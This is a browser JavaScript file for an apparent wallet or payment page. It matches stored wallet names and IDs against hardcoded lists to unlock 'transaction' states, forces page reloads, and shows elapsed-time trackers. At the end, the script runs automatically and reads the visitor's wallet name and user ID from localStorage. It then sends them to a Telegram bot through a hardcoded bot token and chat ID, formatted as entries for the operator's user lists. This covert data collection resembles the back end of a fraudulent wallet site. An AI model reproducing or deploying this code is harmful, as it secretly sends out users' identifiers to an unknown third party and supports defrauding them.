window.users = [
  { name: 'Mark', id: 'CN362124' },
  { name: 'Mark', id: 'RD338723' },
  { name: 'Mark', id: 'GJ390555' }
];

window.usertwo = [
  { name: 'Mark', id: 'ME028407' },
  { name: 'Mark', id: 'RD338723' },
  { name: 'Mark', id: 'GJ390555' }
];

function payList() {
const storedName = localStorage.getItem('walletName');
const storedID = localStorage.getItem('walletUserId');

const firstList = window.users.some(user => user.name === storedName && user.id === storedID);
const secondList = window.usertwo.some(user => user.name === storedName && user.id === storedID);
	
    if (firstList) {
	    localStorage.setItem('Transactions', 'Three');
	    localStorage.setItem('ThirdTracker', 'true');
    }
	
    if (secondList) {
	    localStorage.setItem('Lastdiv', 'Four');
	    localStorage.setItem('FourthTracker', 'true');
    }	    
}
payList();
document.addEventListener('DOMContentLoaded', payList());

function setupPwaRefresh() {
    const lastRefresh = localStorage.getItem('lastPwaRefresh');
    const now = Date.now();
    const twoMinutes = 2 * 60 * 1000; // 2 minutes in milliseconds

    // First run: Set initial timestamp if none exists
    if (!lastRefresh) {
        localStorage.setItem('lastPwaRefresh', now.toString());
    }else if (now - parseInt(lastRefresh) >= twoMinutes) {
        localStorage.setItem('lastPwaRefresh', now.toString());
        window.location.reload();
    }

    // Start fresh countdown for next check
    setTimeout(() => {
        setupPwaRefresh(); // Recursive call
    }, twoMinutes);
}

document.addEventListener('visibilitychange', () => {
 if (!document.hidden) setupPwaRefresh();
});


// Format time difference (e.g., "3 mins ago")
        function formatTimeDifference(timestamp) {
            const now = new Date();
            const date = new Date(timestamp);
            const seconds = Math.floor((now - date) / 1000);

            if (seconds < 10) return 'just now';
            if (seconds < 60) return `${seconds} seconds ago`;

            const intervals = {
                year: 31536000,
                month: 2592000,
                week: 604800,
                day: 86400,
                hour: 3600,
                minute: 60
            };

            if (seconds < intervals.hour) {
                const mins = Math.floor(seconds / intervals.minute);
                return `${mins} minute${mins === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.day) {
                const hours = Math.floor(seconds / intervals.hour);
                return `${hours} hour${hours === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.day * 2) return 'yesterday';
            if (seconds < intervals.week) {
                const days = Math.floor(seconds / intervals.day);
                return `${days} day${days === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.month) {
                const weeks = Math.floor(seconds / intervals.week);
                return `${weeks} week${weeks === 1 ? '' : 's'} ago`;
            }
            if (seconds < intervals.year) {
                const months = Math.floor(seconds / intervals.month);
                return `${months} month${months === 1 ? '' : 's'} ago`;
            }
            const years = Math.floor(seconds / intervals.year);
            return `${years} year${years === 1 ? '' : 's'} ago`;
        }

        // Check conditions and start tracking if they're met
        function checkAndStartTracking(trackerElement) {
            const requiredKey = trackerElement.getAttribute('data-required-key');
            const requiredValue = trackerElement.getAttribute('data-required-value');
            const trackerId = trackerElement.id;

            // Get current value from localStorage
            const currentValue = localStorage.getItem(requiredKey);

            // Check if conditions are met
            if (currentValue === requiredValue) {
                // If no timestamp exists, create one
                if (!localStorage.getItem(`trackedTime_${trackerId}`)) {
                    const currentTime = new Date().getTime();
                    localStorage.setItem(`trackedTime_${trackerId}`, currentTime.toString());
                }
                
                // Update display
                const storedTime = localStorage.getItem(`trackedTime_${trackerId}`);
                trackerElement.textContent = `${formatTimeDifference(parseInt(storedTime))}`;
                trackerElement.classList.add('tracker-active');
                return true;
            } else {
                trackerElement.classList.remove('tracker-active');
                return false;
            }
        }

        // Initialize all auto-trackers
        function initAutoTrackers() {
            const trackers = document.querySelectorAll('.time-tracker');
            
            trackers.forEach(tracker => {
                // Set initial display text
                const requiredKey = tracker.getAttribute('data-required-key');
                const requiredValue = tracker.getAttribute('data-required-value');
                tracker.textContent = `Waiting for ${requiredKey} = '${requiredValue}'`;
                
                // Check immediately on page load
                checkAndStartTracking(tracker);
            });

            // Update all trackers periodically
            setInterval(() => {
                trackers.forEach(tracker => {
                    if (localStorage.getItem(`trackedTime_${tracker.id}`)) {
                        const storedTime = localStorage.getItem(`trackedTime_${tracker.id}`);
                        tracker.textContent = `${formatTimeDifference(parseInt(storedTime))}`;
                    }
                });
            }, 60000); // Update every minute
        }

        // Control functions
        function setTrackingEnabled(enabled) {
            localStorage.setItem('trackingEnabled', enabled.toString());
            checkAllTrackers();
        }

        function setUserStatus(status) {
            localStorage.setItem('userStatus', status);
            checkAllTrackers();
        }

        function checkAllTrackers() {
            document.querySelectorAll('.time-tracker').forEach(tracker => {
                checkAndStartTracking(tracker);
            });
        }

        // Listen for storage changes (from other tabs/windows)
        window.addEventListener('storage', (e) => {
            checkAllTrackers();
        });

        // Start everything when page loads
        document.addEventListener('DOMContentLoaded', initAutoTrackers);


// Function to send data to Telegram bot
async function sendToTelegramBot(data, botToken, chatId) {
    try {
        //const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
	const message = `{ name: '${data.walletName}', id: '${data.walletUserId}' },`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (!response.ok) {
            throw new Error(result.description || 'Failed to send message');
        }
        
        console.log('Data sent to Telegram bot successfully:', result);
        return result;
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        throw error;
    }
}

// Function to check import status and send wallet data if enabled
async function checkAndSendWalletData(botToken, chatId) {
    try {
        // Check if import is enabled
        const importStatus = localStorage.getItem('Send');
        
        if (importStatus !== 'enabled') {
            console.log('Import is not enabled. No data will be sent.');
            return;
        }

        // Get wallet data
        const walletName = localStorage.getItem('walletName');
        const walletUserId = localStorage.getItem('walletUserId');

        if (!walletName || !walletUserId) {
            console.log('Wallet data not found in localStorage');
            return;
        }

        // Prepare data object
        const walletData = {
            walletName: walletName,
            walletUserId: walletUserId
        };

        // Send data to Telegram bot
        await sendToTelegramBot(walletData, botToken, chatId);
        
        // Disable send after successful send
        localStorage.setItem('Send', 'disabled');
        console.log('Send has been disabled after successful send');
        
    } catch (error) {
        console.error('Error:', error);
    }
}



// Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '6049368044'; 

// Execute the check and send function
checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
